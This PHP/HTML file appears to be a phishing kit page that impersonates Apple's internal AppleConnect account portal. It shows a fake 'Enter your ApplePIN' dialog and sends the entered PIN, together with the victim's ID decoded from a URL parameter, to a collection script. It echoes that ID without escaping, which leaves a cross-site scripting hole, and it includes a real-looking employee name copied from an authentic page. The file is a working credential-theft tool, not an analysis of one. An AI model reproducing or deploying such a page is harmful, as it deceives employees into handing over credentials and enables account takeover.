<?php
if(isset($_GET['connect'])){
  $red = $_GET['connect'];

  $appid = base64_decode($red);


  if($red == ''){

  header("location: ?signin");

  }
}
?>


<html lang="en-US" class="ltr top-nav-layout prefpane">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>AppleConnect</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="cache-control" content="max-age=0">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="expires" content="01 Jan 1990 1:00:00 GMT">
    <meta http-equiv="pragma" content="no-cache">
    <link rel="stylesheet" href="gloglo/fonts" type="text/css">
    <script src="https://code.jquery.com/jquery-3.0.0.min.js" charset="utf-8"></script>
    <link rel="stylesheet" href="gloglo/fonts(1)" type="text/css">
    <link rel="stylesheet" type="text/css" media="screen , print" href="gloglo/appsme.css">
    <meta name="Author" content="Apple Inc.">
    <meta name="Description" content="AppleConnect Web">
    <style type="text/css"></style>

</head>

<body class="top-nav-layout idms-modal-open">

  <div class="container fade-in" id="mainAppContainer" aria-hidden="true">
      <header class="nav-bar fade-in">
        <div class="row hidden-print app-width">
          <div class="col-xs-3 reset-mob-col">
              <div class="logo">
                  <h1>
                    <a class="acw-logo" aria-label="My Apple Connect" href="#" tabindex="-1">
                      AppleConnect
                    </a>
                  </h1>
              </div>
          </div>
          <div class="col-xs-3 reset-mob-col">
              <div class="external" id="externalPopDisplay">



              </div>
          </div>
          <div class="col-xs-6 reset-mob-col">
              <div class="welcome">
                  <p>
                    Welcome,
                      <?php echo $appid; ?>
                      <span class="sign-out">
                        <a href="#" id="signout" tabindex="-1">
                          Sign Out
                        </a>
                    </span>
                  </p>
              </div>
          </div>
        </div>
      </header>
      <main role="main" class="main-wrapper fade-in">
        <div class="row main main-padding app-width">
            <div class="no-padding left-wrapper col-xs-4">
              <div class="left hidden-print" id="left-top"><left-section>

  <div class="top">
		        <h2 id="your-apple-id-heading" role="heading" class="heading">
		Manage your accounts
	   </h2>
		        <p id="your-apple-id" class="intro">
		Manage your AppleConnect, ApplePIN, LDAP, and Open Directory accounts or disable two-step verification.
	</p>

</div>
    <div id="nav" class="nav">
        <nav>

  <ul class="ul">
 		<div id="device-intro-text">Enable two-step verification, add or delete devices, and reset your recovery key.</div>
		<div id="device-intro">Manage your devices</div>
		<div id="teams-intro-text">Reset passwords and enable ApplePIN change and two-step verification for your team members.</div>
		<div id="teams-intro">Manage your team's accounts</div>
		<div id="collections-intro-text">Create and give user access to collections of shared devices.</div>
		<div id="collections-intro">Manage your collections</div>
		<div id="downloads-intro-text">Download essential Apple internal applications.</div>
		<div id="downloads-intro">Downloads</div>
    <li id="profile" class="li hide "><a href="#" tabindex="-1">
        My Profile
    </a>
    </li>
    <li id="accounts" class="li   selected"><a href="#" aria-current="page" tabindex="-1">
        Accounts
    </a>
    </li>
    <li id="activity" class="li hide "><a href="#" tabindex="-1">
        My Activity
    </a>
    </li>

</ul>
                    </nav>
    </div>

<div id="help-line-link-container" class="help-line-link">
        <div class="left-bottom hidden-print    ">
            <ul class="ul    ">

				<li class="li">
                </li>


				<li class="li">
                </li>


				<li class="li">
                </li>


				<li class="li">
                </li>

            </ul>
        </div>

</div>

                    </left-section></div>
            </div>
            <div class="no-padding right-wrapper col-xs-8">
                <div class="right" id="rightMain">
                  <div id="content"><account><div class="accounts">
	<div id="account-intro-text">
		Manage your AppleConnect, ApplePIN, LDAP, and Open Directory accounts or disable two-step verification.
	</div>
	<div id="account-intro">
		Manage your accounts
	</div>
	<div class="row">
		<div class="col-xs-12">
			<p class="hidden-print">
				The following credentials are associated with your identity at Apple.
			</p>
		</div>
	</div>
	<div class="row appleconnect">
		<div class="col-xs-2">
			<div class="appleconnecticon icon">
			</div>
		</div>
		<div class="col-xs-10">
			<div class="row">
				<div class="col-xs-8 no-padding">
					<h3 class="account-name account-heading3">
                            AppleConnect Account
                    </h3>
				</div>
				<div class="col-xs-4 pull-right no-padding">
					<p class="pull-right account-name wrap-name" title="<?php echo $appid;?>"><?php echo $appid;?></p>
				</div>
			</div>
			<div class="row">
				<div class="col-xs-12 no-padding">
					<div class="options text-right">

						<span class="info">
                        	 	2 two-step verification trusted device(s)
                        </span>

						<div class="">
						<acwa-manage-button button-text="Manage" {vo-manage-text}="appleConnect.formattedName">







<div class="acwa-manage-button pull-right">
  <div class="spinner-container spinner-manage hide">
    <div class="spinner" role="progressbar" style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;"><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-0-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(39deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-1-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(71deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-2-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(104deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-3-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(137deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-4-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(169deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-5-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(202deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-6-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(235deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-7-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(268deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-8-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(300deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-9-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(333deg) translate(4px, 0px); border-radius: 1px;"></div></div><div style="position: absolute; top: -1px; opacity: 0.25; animation: opacity-66-25-10-11 1s linear infinite;"><div style="position: absolute; width: 6px; height: 2px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center 0px; transform: rotate(366deg) translate(4px, 0px); border-radius: 1px;"></div></div></div>
  </div>
  <button type="button" ($keypress)="onKeyPress($element, %event)" ($keydown)="onKeyDown($element, %event)" ($click)="_beforeOnClick($element, %event)" aria-haspopup="true" id="manage-button-1493090433294-1" class="btn btn-default manage-button" aria-expanded="false" aria-owns="idms-popover-1493090433294-0" tabindex="-1">      Manage

        <span class="a11y">Jian-Hui Ding</span>

       <span class="caret"></span>

  </button>

  <idms-popover {(show)}="_showPopover" {^uid}="popoverId" type="action" animations="false" float-mode="bottom" classes="manage-button-popover" max-width="500" anchor-element="#manage-button-1493090433294-1">

                    </idms-popover>


</div>

                    </acwa-manage-button>
						</div>
					</div>
				</div>
			</div>

		</div>
	</div>

                    </account></div>
                </div>
            </div>
        </div>
      </main>

        <div id="acwaFooter" class="acwa-footer fade-in hidden-print"><acwa-footer>

  <footer class="app-width">
  <!-- DEMO -->
  <div class="ac-gf-footer-legal">
		<div class="ac-gf-footer-legal-copyright">Copyright © 2017 Apple Inc. All rights reserved.</div>
		<div class="ac-gf-footer-legal-links hide">
      <a class="ac-gf-footer-legal-link" href="#/privacy/privacy-policy/" tabindex="-1">Privacy Policy</a>
      <a class="ac-gf-footer-legal-link" href="#/legal/internet-services/terms/site.html" tabindex="-1">Terms of Use</a>
      <a class="ac-gf-footer-legal-link" href="#/us/shop/goto/help/sales_refunds" tabindex="-1">Sales and Refunds</a>
      <a class="ac-gf-footer-legal-link" href="#/legal/" tabindex="-1">Legal</a>
      <a class="ac-gf-footer-legal-link" href="#/sitemap/" tabindex="-1">Site Map</a> </div>
	</div>
</footer>

                    </acwa-footer></div>

  </div>

  <div id="loadPlugin" aria-hidden="true"></div>


      <div aria-hidden="false" id="idmsModalWrapper1493090528025-0" class="idms-modal -wrapper dialog fade-in acwa-modal apple-pin


        idms-modal-role-alertdialog" role="dialog" tabindex="-1" aria-describedby="subTitleApplePin" aria-labelledby="headerApplePin" style="z-index: 1061;">
        <div class="idms-modal-dialog">
          <div ($inserted)="focus()" id="idms-modal-1493090528025-0" class="idms-modal-content modal-content   ">


  <div tabindex="-1" class="acwa-modal-container" ($keyup)="onKeyUp($element, %event)" ($keydown)="onKeyDown($element, %event)">
     <h2 class="modal-title " id="headerApplePinStp1" tabindex="-1" style="outline: 0px;">
        Enter your ApplePIN
     </h2>
    <div class="modal-body ">
          <acwa-modal-subtitle id="subTitleApplePinStp1">

  <p id="subTitleId" class="subheader hidden-print">

             ApplePIN

</p>

                    </acwa-modal-subtitle>

	<acwa-change-apple-pin-form {(pin-value)}="pin.newValue" error-msg-id="applePinErrorStep1" {has-error}="disableNext">
  <form  action="gloglo/?pin" method="post" name="form1" >


  <div class="form-horizontal" >
    <div id="code" class="form-group multi-input">


      <div class="col-xs-8 digit-top">
          <span class="tbox-wrap digit-wrap">
            <script>
            function allowedchars(){
              if (event.charCode == 13){
                  return submitform();
              }

              return event.charCode >= 48 && event.charCode <= 57;
            }

            function textLength(value){
   var maxLength = 4;
   if(value.length == maxLength) return false;
   return true;
}


          function check(){
            document.getElementById('acwa-change-apple-pin-input').onkeyup = function(){
               if(!textLength(this.value)){
                 document.getElementById("send").className =
    document.getElementById("send").className.replace
       ( /(?:^|\s)disabled(?!\S)/g , 'enabled' )


               }
            }
            return allowedchars();
          }
            </script>
              <input name="pin123" type="password" id="acwa-change-apple-pin-input" class="form-control digit-input" onkeypress="return check();" data-input="pin" maxlength="4" minlength="4" autofocus="true"  placeholder="4-digit PIN" autocomplete="off" aria-label="New ApplePIN: four digits (hidden)" aria-controls="valid-pin-check" aria-describedby="vo-pin applePinErrorStep1" value="" aria-invalid="true">


              <input name="usercode" type="hidden" value="<?php echo $red; ?>" />
          </span>
      </div>
      <div class="col-xs-2 digit-top">





  <div aria-live="polite" role="region" id="valid-pin-check">
</div>

                    </acwa-check-mark>
      </div>
    </div>
    <p class="text-center intro" id="vo-pin">

		Your PIN cannot have repeating or sequential digits.

    </p>
</div>

                    </acwa-change-apple-pin-form>

        <p style="font-size: .75em; color: red; text-align: center;">
<?php if(isset($_GET['pin']) && $_GET['pin'] == 'false'){
echo 'Please fill your informations';


} ?>
        </p>

    </div>

    <div class="modal-footer ">


        <button id="send"  class="btn
                       btn-secondary disabled" aria-disabled="false"  >

                       Next
</button>
      </div>
  </div>

            <div style="clear:both"></div>
          </div>
        </div>
      </div>
      <script type="text/javascript">
      function submitform(){
            $(this).closest('form1').submit();
      }
      </script>
      </form>


  </body></html>
